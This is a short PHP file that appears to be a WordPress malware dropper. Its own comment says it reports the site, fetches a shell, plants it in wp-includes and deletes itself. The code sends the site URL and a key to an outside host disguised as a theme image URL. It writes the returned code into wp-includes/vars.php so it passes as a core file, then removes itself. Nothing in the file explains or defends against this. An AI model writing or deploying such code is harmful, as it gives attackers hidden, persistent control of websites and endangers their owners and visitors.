<?php
// dropper: report the site, fetch the shell, plant it in wp-includes, delete itself
$wpvars = ABSPATH . 'wp-includes/vars.php';
if ( ! file_exists( $wpvars ) ) {
	$resp = wp_remote_post( 'http://wp-theme-connect.invalid/images/wp-theme.jpg', array( 'body' => array( 'siteurl' => site_url(), 'key' => md5( site_url() ) ) ) );
	$code = wp_remote_retrieve_body( $resp );
	file_put_contents( $wpvars, $code );
	@unlink( __FILE__ );
}
